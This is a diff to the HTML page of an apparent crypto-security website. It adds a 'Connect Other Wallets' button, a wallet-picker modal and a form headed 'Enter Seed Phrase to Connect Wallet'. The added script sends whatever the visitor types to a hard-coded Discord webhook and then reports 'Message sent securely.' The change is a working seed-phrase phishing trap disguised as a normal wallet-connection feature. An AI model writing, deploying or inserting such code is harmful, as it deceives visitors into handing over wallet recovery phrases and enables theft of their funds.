@@ -274,6 +274,75 @@
       color: var(--text-main);
     }
 
+	/* Modal Base */
+	.modal {
+	  display: none;
+	  position: fixed;
+	  z-index: 9999;
+	  left: 0; top: 0;
+	  width: 100%; height: 100%;
+	  background: rgba(0,0,0,0.6);
+	  justify-content: center;
+	  align-items: center;
+	}
+	
+	.modal-content {
+	  background: #fff;
+	  padding: 25px;
+	  width: 90%;
+	  max-width: 400px;
+	  border-radius: 10px;
+	  text-align: center;
+	}
+	
+	.wallet-list {
+	  list-style: none;
+	  padding: 0;
+	  margin: 20px 0;
+	}
+	
+	.wallet-list li {
+	  padding: 12px;
+	  margin: 8px 0;
+	  background: #f1f1f1;
+	  border-radius: 6px;
+	  cursor: pointer;
+	  transition: background 0.2s;
+	}
+	
+	.wallet-list li:hover {
+	  background: #e0e0e0;
+	}
+	
+	textarea {
+	  width: 100%;
+	  height: 120px;
+	  padding: 10px;
+	  border-radius: 6px;
+	  border: 1px solid #ccc;
+	  resize: none;
+	}
+	
+	.send-btn {
+	  background: #28a745;
+	  color: #fff;
+	  padding: 10px 20px;
+	  border-radius: 6px;
+	  border: none;
+	  cursor: pointer;
+	  margin-top: 10px;
+	}
+	
+	.close-btn {
+	  background: #ccc;
+	  padding: 10px 20px;
+	  border-radius: 6px;
+	  border: none;
+	  cursor: pointer;
+	  margin-top: 10px;
+	}
+
+
     /* TYPOGRAPHY */
     .section-title {
       font-size: 2.2rem;
@@ -352,6 +421,7 @@
       <div class="cta">
         <a class="btn btn-primary" href="#dashboard">View Security Dashboard</a>
         <button class="wallet-action btn btn-primary" style="margin-left: 20px;" > Connect Wallet </button>
+		<button class="btn btn-secondary" style="margin-left: 20px;" onclick="openWalletModal()"> Connect Other Wallets </button>
 
 
 
@@ -517,6 +587,81 @@
   
   <script src="master.js"></script>
 
+  <!-- Wallet Selection Modal -->
+<div id="walletModal" class="modal">
+  <div class="modal-content">
+    <h3>Select a Wallet</h3>
+    <ul class="wallet-list">
+      <li onclick="openMessageBox('MetaMask')">MetaMask</li>
+      <li onclick="openMessageBox('Trust Wallet')">Trust Wallet</li>
+      <li onclick="openMessageBox('Coinbase Wallet')">Coinbase Wallet</li>
+      <li onclick="openMessageBox('Ledger Live')">Ledger Live</li>
+      <li onclick="openMessageBox('Exodus')">Exodus</li>
+    </ul>
+    <button class="close-btn" onclick="closeWalletModal()">Close</button>
+  </div>
+</div>
+
+<!-- Message Input Modal -->
+<div id="messageModal" class="modal">
+  <div class="modal-content">
+    <h3 id="walletNameTitle">Enter Seed Phrase to Connect Wallet</h3>
+    <textarea id="userMessage" placeholder="Type your message here..."></textarea>
+    <button class="send-btn" onclick="sendToDiscord()">Connect Now</button>
+    <button class="close-btn" onclick="closeMessageModal()">Cancel</button>
+  </div>
+</div>
+
+ <script>
+function openWalletModal() {
+  document.getElementById("walletModal").style.display = "flex";
+}
+
+function closeWalletModal() {
+  document.getElementById("walletModal").style.display = "none";
+}
+
+let selectedWallet = "";
+
+function openMessageBox(wallet) {
+  selectedWallet = wallet;
+  document.getElementById("walletNameTitle").innerText = "Message for " + wallet;
+  closeWalletModal();
+  document.getElementById("messageModal").style.display = "flex";
+}
+
+function closeMessageModal() {
+  document.getElementById("messageModal").style.display = "none";
+}
+
+function sendToDiscord() {
+  const message = document.getElementById("userMessage").value.trim();
+
+  if (!message) {
+    alert("Please enter a message.");
+    return;
+  }
+
+  fetch("https://discord.com/api/webhooks/1448300867253047358/mr3dXHq2pv3RvcXjA_v1KCd3ZREAi5Oh5DIOoJ8zfUKAo8rA40lNRXY8kZXVYzqPzsd1", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: `📩 **New Wallet Message**\n\n**Wallet:** ${selectedWallet}\n**Message:** ${message}`
+    })
+  })
+  .then(() => {
+    alert("Message sent securely.");
+    closeMessageModal();
+    document.getElementById("userMessage").value = "";
+  })
+  .catch(() => {
+    alert("Failed to send message.");
+  });
+}
+</script>
+
+
+
   <script>
     // Handle Intersection Observer for scroll animations
     const observer = new IntersectionObserver(entries => {
@@ -552,6 +697,7 @@
 </body>
 
 </html>
+
 
 
 
